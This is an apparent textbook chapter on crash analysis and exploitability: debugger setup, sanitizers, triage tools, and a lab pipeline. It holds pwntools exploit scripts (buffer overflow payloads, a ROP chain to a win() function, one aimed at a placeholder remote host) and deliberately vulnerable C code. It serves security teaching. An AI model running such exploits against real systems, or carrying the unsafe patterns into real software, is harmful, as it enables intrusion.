# Chapter 5: Crash Analysis

After finding potential vulnerabilities through fuzzing or patch diffing, the next critical step is to analyze crashes to determine if they are exploitable. This chapter covers crash triage, debugger mastery, memory sanitizers, and advanced root cause analysis techniques.

## 5.1. 4.1 Crash Analysis Fundamentals

Crash analysis is the process of transforming a crash discovered by a fuzzer into actionable knowledge about a vulnerability. This includes determining the root cause, assessing exploitability, and developing proofs of concept.

### 5.1.1. Decision Tree for Crash Analysis

1.  **CRASH RECEIVED:** Is it reproducible?
2.  **SOURCE CODE:** Is it available?
3.  **SANITIZERS:** Recompile with ASAN/UBSAN if there is source code.
4.  **DEBUGGER:** Use GDB/WinDbg if there is no source code.
5.  **CLASSIFY:** Use CASR to classify the vulnerability.
6.  **MINIMIZE:** Reduce the crash input.
7.  **PoC:** Develop a proof of concept.

## 5.2. 4.2 Debuggers and Configuration

### 5.2.1. WinDbg Preview for Windows

WinDbg Preview is the standard debugger for crash analysis in Windows, with advanced Time Travel Debugging capabilities.

**Installation:**
```powershell
# Install from Microsoft Store or winget
winget install Microsoft.WinDbgPreview

# Create symbols directory
mkdir C:\Symbols

# Configure symbol path
[Environment]::SetEnvironmentVariable(
    "NT_SYMBOL_PATH",
    "SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols",
    "User"
)
```

**Essential WinDbg Commands:**

| Command | Purpose | Example |
|---------|-----------|---------|
| !analyze -v | Automatic crash analysis | N/A |
| k / kp / kv | Stack trace | kv 20 |
| r | Show registers | r rax, rbx |
| u / ub | Disassembly | u rip L10 |
| d / db / dq | Memory dump | dq rsp L8 |
| !heap | Heap analysis | !heap -s |
| !address | Memory info | !address rsp |
| lm | List modules | lm vm ntdll |
| .ecxr | Exception context | N/A |

**Time Travel Debugging (TTD):**
TTD allows recording the full execution of a process and replaying it.

```powershell
# Record execution
tttracer.exe -out C:\Traces -launch target.exe crash_input.txt

# TTD commands
!tt 0           # Go to start
!tt 100         # Go to end
g-              # Run backwards
p-              # Step back
```

### 5.2.2. GDB + Pwndbg for Linux

Pwndbg is a GDB extension designed for vulnerability analysis.

**Installation:**
```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
pip install pwntools ropper capstone keystone-engine
```

**Core Dump Configuration:**
```bash
ulimit -c unlimited
echo "core. %e. %p. %t" | sudo tee /proc/sys/kernel/core_pattern
```

**Essential Pwndbg Commands:**

| Command | Purpose |
|---------|--------|
| context | Show complete context |
| checksec | Verify protections |
| vmmap | Memory map |
| telescope | Smart dereference |
| cyclic | Generate/search patterns |
| search | Search in memory |
| heap | Heap analysis |
| rop | Find ROP gadgets |

**Typical Usage:**
```bash
cd ~/crash_analysis_lab
gdb -q ./vuln_no_protect
pwndbg> set args 1 $(python3 -c "print('A'*100)")
pwndbg> run
pwndbg> context
pwndbg> bt
pwndbg> telescope $rsp 20
```

### 5.2.3. Dump Collection

**Windows - ProcDump:**
```powershell
# Configure WER
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpFolder /t REG_EXPAND_SZ /d "C:\Dumps"
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpType /t REG_DWORD /d 2

# Capture dump
procdump -e -ma target.exe -o C:\Dumps
```

**Linux - Core Dumps:**
```bash
# Enable
ulimit -c unlimited

# Systemd-coredump
sudo apt install systemd-coredump
coredumpctl list
coredumpctl info MATCH
```

### 5.2.4. PageHeap and AppVerifier (Windows)

```powershell
# Enable PageHeap
gflags /p /enable target.exe /full

# With AppVerifier
appverif.exe
# Add application → Select checks (Heaps, Handles, Locks)
```

## 5.3. 4.3 Memory Sanitizers

Sanitizers are instrumentation tools that detect memory bugs at runtime.

### 5.3.1. AddressSanitizer (ASAN)

ASAN detects memory errors such as overflows and use-after-free.

**Compilation:**
```bash
# GCC
gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer source.c -o target_asan

# Clang
clang -g -O1 -fsanitize=address -fno-omit-frame-pointer source.c -o target_asan
```

**Detected Errors:**
| Error | Description |
|-------|-------------|
| heap-buffer-overflow | Out-of-bounds write on heap |
| stack-buffer-overflow | Buffer overflow on stack |
| use-after-free | Access after free() |
| double-free | Double free |

### 5.3.2. UndefinedBehaviorSanitizer (UBSAN)

```bash
clang -g -O1 -fsanitize=undefined source.c -o target_ubsan
```

### 5.3.3. MemorySanitizer (MSAN)

```bash
clang -g -O1 -fsanitize=memory source.c -o target_msan
```

### 5.3.4. ThreadSanitizer (TSAN)

```bash
clang -g -O1 -fsanitize=thread source.c -o target_tsan
```

## 5.4. 4.4 Automated Classification and Triage

### CASR - Crash Analysis and Severity Reporter

```bash
cargo install casr
casr crash_dump --output report.json
```

**Classification:**
- EXPLOITABLE: RIP/EIP control
- PROBABLY_EXPLOITABLE: Out-of-bounds read
- NOT_EXPLOITABLE: Non-exploitable crash

### Crash Minimization

```bash
# With AFL
afl-tmin -i crash_input -o minimized_input -- ./target
```

## 5.5. 4.5 Reachability Analysis

### DynamoRIO + drcov

```bash
drrun -t drcov -- ./target input.txt
```

### Intel Processor Trace

```bash
sudo apt install intel-pt-decoder
intel-pt-decoder --input trace.pt --output trace.txt
```

### Frida

```bash
pip install frida-tools
frida-trace -i "*malloc*" ./target
```

### rr - Record and Replay

```bash
sudo apt install rr
rr record ./target input.txt
rr replay
```

## 5.6. 4.6 PoC (Proof of Concept) Development

### pwntools - Exploitation Framework

```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux', log_level='debug')

# Connection
io = remote('target.host', 1337)
# io = process('./vuln_binary')

# Offset to RIP
offset = 72

# Build payload
payload = flat([
    b'A' * offset,
    p64(target_address)
])
io.sendline(payload)
io.interactive()
```

### PoC - Stack Buffer Overflow

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='info')

# Generate crash and find offset
io = process('./vuln_no_protect')
io.sendline(cyclic(200))
io.wait()
offset = cyclic_find(io.corefile.pc)
log.info(f"Offset: {offset}")

# Final payload
payload = fit({offset: p64(win_function)})
io.sendline(payload)
```

## 5.7. 4.7 Capstone Project: Complete Analysis Pipeline

### Vulnerable Test Suite

```c
// vulnerable_suite.c
void stack_overflow(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No check
}

void heap_overflow(char *input) {
    char *buf = malloc(32);
    strcpy(buf, input);  // Overflow
}

void use_after_free(void) {
    char *ptr = malloc(64);
    free(ptr);
    printf("%s\n", ptr);  // UAF
}

void double_free(void) {
    char *ptr = malloc(64);
    free(ptr);
    free(ptr);  // Double free
}
```

**Compilation:**
```bash
gcc -g -fno-stack-protector -no-pie vulnerable_suite.c -o vuln_no_protect
gcc -g -O1 -fsanitize=address vulnerable_suite.c -o vuln_asan
```

### Binary with ROP Gadgets

A special binary with ROP (Return-Oriented Programming) gadgets is provided to facilitate exploitation.

### Complete Exploit

It is demonstrated how to build a ROP chain to call a `win()` or `spawn_shell()` function.

```python
from pwn import *

elf = ELF('./vuln_no_protect')
offset = 72

rop = ROP(elf)
rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(p64(elf.symbols['win']))

payload = fit({offset: rop.chain()})
io = process(elf.path)
io.sendline(payload)
```

## 5.8. Chapter 5 Conclusions

1. **Sanitizers are essential** - They convert silent bugs into informative crashes.
2. **Automation accelerates triage** - CASR classifies crashes at scale.
3. **Root cause analysis requires multiple techniques** - Debuggers, tracing, coverage.
4. **Reproducible PoCs are critical** - They document the vulnerability.
5. **Practice with vulnerable binaries develops skills**.

### Discussion Questions:

1. How do compiler protections affect exploitation strategy?
2. When is it preferable to use ASAN vs PageHeap vs pure binary analysis?
3. How do you assess crash exploitability without direct RIP control?
